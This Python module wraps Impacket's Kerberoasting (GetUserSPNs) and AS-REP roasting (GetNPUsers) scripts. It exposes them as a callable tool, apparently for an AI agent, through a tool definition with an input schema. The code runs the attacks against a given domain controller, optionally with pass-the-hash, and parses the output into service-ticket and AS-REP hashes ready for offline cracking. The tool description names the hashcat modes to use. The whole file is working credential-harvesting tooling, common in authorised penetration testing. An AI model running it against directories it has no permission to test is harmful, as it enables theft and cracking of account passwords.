"""
Impacket Kerberos attacks: Kerberoasting (GetUserSPNs) and AS-REP Roasting (GetNPUsers).
"""
import re
import shlex
import shutil
import subprocess
from core import proc as runner
from typing import Optional


def impacket_kerberos(domain: str, dc: str, attack: str = "kerberoast",
                      username: Optional[str] = None, password: Optional[str] = None,
                      hash: Optional[str] = None, flags: Optional[str] = None) -> dict:
    attack = attack.lower()
    if attack == "kerberoast":
        return _kerberoast(domain, dc, username, password, hash, flags)
    elif attack in ("asreproast", "asrep", "as-rep"):
        return _asrep_roast(domain, dc, username, password, flags)
    else:
        return {"error": f"Unknown attack type '{attack}'. Use 'kerberoast' or 'asreproast'."}


def _kerberoast(domain, dc, username, password, hash, flags):
    binary = shutil.which("GetUserSPNs.py") or shutil.which("impacket-GetUserSPNs")
    if not binary:
        return {"error": "GetUserSPNs.py not found. Install impacket."}

    if username and password:
        target = f"{domain}/{username}:{password}"
    elif username and hash:
        target = f"{domain}/{username}"
    elif username:
        target = f"{domain}/{username}"
    else:
        target = f"{domain}/"

    cmd = [binary, target, "-dc-ip", dc, "-request", "-outputfile", "/dev/stdout"]
    if hash:
        cmd += ["-hashes", hash]
    if flags:
        cmd += shlex.split(flags)

    try:
        proc = runner.run(cmd, capture_output=True, text=True, timeout=120)
    except subprocess.TimeoutExpired:
        return {"error": "GetUserSPNs.py timed out"}

    output = proc.stdout + proc.stderr
    return _parse_spns(output, " ".join(cmd))


def _asrep_roast(domain, dc, username, password, flags):
    binary = shutil.which("GetNPUsers.py") or shutil.which("impacket-GetNPUsers")
    if not binary:
        return {"error": "GetNPUsers.py not found. Install impacket."}

    if username and password:
        target = f"{domain}/{username}:{password}"
    elif username:
        target = f"{domain}/{username}"
    else:
        target = f"{domain}/"

    cmd = [binary, target, "-dc-ip", dc, "-request", "-format", "hashcat"]
    if flags:
        cmd += shlex.split(flags)

    try:
        proc = runner.run(cmd, capture_output=True, text=True, timeout=120)
    except subprocess.TimeoutExpired:
        return {"error": "GetNPUsers.py timed out"}

    output = proc.stdout + proc.stderr
    return _parse_asrep(output, " ".join(cmd))


def _parse_spns(output: str, command: str) -> dict:
    spns: list = []
    hashes: list = []

    for line in output.splitlines():
        # SPN table row: ServicePrincipalName  Name  MemberOf  PasswordLastSet ...
        spn_m = re.match(r"^(\S+/\S+)\s+(\S+)\s+", line)
        if spn_m and "/" in spn_m.group(1) and "ServicePrincipalName" not in line:
            spns.append({"spn": spn_m.group(1), "account": spn_m.group(2)})

        # Kerberos hash
        if line.startswith("$krb5tgs$"):
            hashes.append(line.strip())

    return {
        "attack":   "kerberoast",
        "spns":     spns,
        "hashes":   hashes,
        "count":    len(hashes),
        "raw":      output[:8000],
        "_command": command,
    }


def _parse_asrep(output: str, command: str) -> dict:
    hashes: list = []
    vulnerable_users: list = []

    for line in output.splitlines():
        if line.startswith("$krb5asrep$"):
            hashes.append(line.strip())
            # Extract username from hash
            m = re.match(r"\$krb5asrep\$\d+\$([^@]+)@", line)
            if m:
                vulnerable_users.append(m.group(1))

    return {
        "attack":            "asreproast",
        "vulnerable_users":  vulnerable_users,
        "hashes":            hashes,
        "count":             len(hashes),
        "raw":               output[:3000],
        "_command":          command,
    }


TOOL_DEFINITION = {
    "name": "impacket_kerberos",
    "description": (
        "Kerberos attacks via impacket. Supports:\n"
        "- 'kerberoast': Enumerate SPNs and request service tickets for offline cracking (GetUserSPNs.py)\n"
        "- 'asreproast': Find accounts with Kerberos pre-auth disabled and retrieve AS-REP hashes (GetNPUsers.py)\n"
        "Hashes can be cracked with hashcat: -m 13100 (Kerberoast) / -m 18200 (AS-REP Roast)."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "domain":   {"type": "string", "description": "Active Directory domain, e.g. 'lab.local'"},
            "dc":       {"type": "string", "description": "Domain controller IP or hostname"},
            "attack":   {"type": "string", "description": "'kerberoast' or 'asreproast'"},
            "username": {"type": "string", "description": "Domain username for authenticated enumeration"},
            "password": {"type": "string", "description": "Password for the above user"},
            "hash":     {"type": "string", "description": "NTLM hash for pass-the-hash (LMHASH:NTHASH)"},
            "flags":    {"type": "string", "description": "Additional impacket flags"},
        },
        "required": ["domain", "dc"],
    },
}
